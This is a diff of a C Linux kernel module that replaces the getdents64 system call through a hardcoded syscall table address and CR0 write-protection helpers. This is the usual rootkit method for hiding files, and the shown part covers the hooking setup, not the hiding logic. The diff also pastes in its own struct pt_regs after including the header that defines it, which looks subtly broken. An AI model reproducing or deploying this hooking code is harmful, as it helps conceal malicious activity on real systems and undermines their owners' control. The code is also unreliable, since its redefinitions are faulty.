@@ -1,16 +1,47 @@
-#include <linux/init.h>
 #include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/errno.h>
-#include <linux/types.h>
-#include <linux/unistd.h>
 #include <linux/dirent.h>
 #include <asm/cacheflush.h>
+#include <asm/ptrace.h>
 #include <linux/uaccess.h>
  
 int new_getdents64(const struct pt_regs *regs);
 int load(void);
 void unload(void);
+
+struct pt_regs {
+/*
+ * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
+ * unless syscall needs a complete, fully filled "struct pt_regs".
+ */
+	unsigned long r15;
+	unsigned long r14;
+	unsigned long r13;
+	unsigned long r12;
+	unsigned long rbp;
+	unsigned long rbx;
+/* These regs are callee-clobbered. Always saved on kernel entry. */
+	unsigned long r11;
+	unsigned long r10;
+	unsigned long r9;
+	unsigned long r8;
+	unsigned long rax;
+	unsigned long rcx;
+	unsigned long rdx;
+	unsigned long rsi;
+	unsigned long rdi;
+/*
+ * On syscall entry, this is syscall#. On CPU exception, this is error code.
+ * On hw interrupt, it's IRQ number:
+ */
+	unsigned long orig_rax;
+/* Return frame for iretq */
+	unsigned long rip;
+	unsigned long cs;
+	unsigned long eflags;
+	unsigned long rsp;
+	unsigned long ss;
+/* top of stack page */
+};
 
 typedef asmlinkage int (*original_getdents64_t)(const struct pt_regs *regs);
 static unsigned long *syscall_table = (unsigned long *)0xffffffff842001a0; 
@@ -33,7 +64,7 @@ static inline void one_cr0(void) {
 
 asmlinkage int new_getdents64(const struct pt_regs *regs) {
     int total_bytes_read = (int)original_getdents64_ptr(regs);
-    struct linux_dirent64 *buff = (struct linux_dirent64*)((char*)regs->si);
+    struct linux_dirent64 *buff = (struct linux_dirent64*)((char*)regs->rsi);
 
     if (total_bytes_read > 0) {
         printk(KERN_ALERT "Total bytes read: %d", total_bytes_read);
